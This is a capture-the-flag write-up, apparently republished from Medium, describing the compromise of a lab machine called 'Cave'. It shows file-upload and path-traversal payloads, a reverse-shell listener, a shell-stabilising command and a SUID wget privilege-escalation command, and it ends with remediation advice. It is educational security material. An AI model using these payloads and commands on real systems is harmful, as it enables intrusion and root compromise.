# 🌐 CTF Writeup: Breaking the Cave Lab through LFI and SUID Misconfigurations

> **Original Source:** [CTF Writeup: Breaking the Cave Lab through LFI and SUID Misconfigurations](https://medium.com/@ankushprasadsah47/ctf-writeup-breaking-the-cave-lab-through-lfi-and-suid-misconfigurations-54fb132050c5)
> **Platform:** medium.com | **Category:** `WEB`

---

## 📝 Full Writeup

CTF Writeup: Breaking the Cave Lab through LFI and SUID Misconfigurations[![Ankush Prasad Sah](https://web.archive.org/web/20260110070303im_/https://miro.medium.com/v2/da:true/resize:fill:64:64/0*fMPZ_g-BSr7CrDq2)

](/web/20260110070303/https://medium.com/@ankushprasadsah47?source=post_page---byline--54fb132050c5---------------------------------------)

[Ankush Prasad Sah](/web/20260110070303/https://medium.com/@ankushprasadsah47?source=post_page---byline--54fb132050c5---------------------------------------)

·
Just now

[

](/web/20260110070303/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F54fb132050c5&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ankushprasadsah47%2Fctf-writeup-breaking-the-cave-lab-through-lfi-and-suid-misconfigurations-54fb132050c5&user=Ankush+Prasad+Sah&userId=0edc41fe88a3&source=---header_actions--54fb132050c5---------------------clap_footer------------------)

--



## Hacking the “Cave”: A Web-Application Penetration Testing Writeup
This report details the successful compromise of the **Cave** lab environment. The attack chain progressed from initial reconnaissance to full administrative (root) access through a series of web-based vulnerabilities and misconfigurations.

## 1. Reconnaissance
The engagement began with an **Nmap** scan to identify open ports and services on the target IP `10.81.188.27`.

- **Port 22/tcp:** SSH (Secure Shell)

- **Port 80/tcp:** HTTP (Web Server)

## 2. Initial Access: Exploiting File Upload & LFI
The web application was found to have an **Unrestricted File Upload** vulnerability. To gain access, a **PentestMonkey PHP reverse shell** was utilized.

**Bypass:** The shell was renamed with a `.jpg` extension to bypass basic file type filters.

**LFI Trigger:** The uploaded file was executed by exploiting a **Local File Inclusion (LFI)** vulnerability via deep path traversal in the `page` parameter:

[http://<machine_ip>/?page=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/var/www/uploads/rev_shell.php_00.jpg](https://web.archive.org/web/20260110070303/http://10.81.144.113/?page=....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2F....%5C%2Fvar%2Fwww%2Fuploads%2Frev_shell.php_00.jpg)

**Reverse Shell:** A Netcat listener was established on the Kali machine (`nc -nlvp 4444`) to catch the incoming connection.

## 3. Post-Exploitation & User Flag
Upon gaining access as `www-data`, the shell was stabilized using Python to provide a full TTY.

- **Command:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Capturing User Flag
The user flag was located at `/home/bruce/user.txt`, but direct access was denied. A bypass technique using `wget` was employed to exfiltrate the flag content to a temporary log file.

- wget -i /home/bruce/user.txt -o /tmp/flag.log

- cat /tmp/flag.log

- **User Flag:** `d63d5d8d6321e06f4acb0837a1f671b3`

## 4. Privilege Escalation to Root
To escalate privileges, the system was searched for binaries with the **SUID** bit set.

### Privileged Executable:
- **Command:** find / -type f -perm -04000 -ls 2>/dev/null

- **Critical Vulnerability:** The `/usr/bin/wget` binary was found to have SUID permissions, meaning it runs as the root user.

### Step 1: Exploiting the SUID Binary
By navigating to the `/home/bruce` directory, the SUID version of `wget` was leveraged to bypass restricted access.

- **Navigation:** Moved to the home directory: `cd /home/bruce`.

- **Privilege Trigger:** Executed the following command to exploit the `wget` environment: `./usr/bin/wget --use-askpass=$TF 0`

### Step 2: Accessing the Root Directory
Once the privilege escalation was successful, the root user’s home directory became accessible.

- **Command:** `cd /root`

- **Verification:** Running `ls` confirmed the presence of the final flag file, `root.txt`.

### Step 3: Capturing the Final Flag
The root flag was successfully read:

- **Command:** `cat /root/root.txt`

- **Root Flag:** `47793112489cb4b398f0f4e48392f845`

## Conclusion & Remediation
The compromise of “Cave” highlights the danger of combining minor vulnerabilities (LFI and File Upload) with major configuration errors (SUID binaries).

**Recommendations:**

- **Sanitize Inputs:** Prevent directory traversal in the `page` parameter.

- **Secure SUID Binaries:** Remove the SUID bit from binaries like `wget` that are not essential for administrative tasks.

- **Least Privilege:** Restrict the `www-data` user from accessing or exfiltrating sensitive files in home directories.

**Author:** Ankush Prasad Sah

---

*📖 Originally published on [Medium](https://medium.com/@ankushprasadsah47/ctf-writeup-breaking-the-cave-lab-through-lfi-and-suid-misconfigurations-54fb132050c5). All credit goes to the original author.*
*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
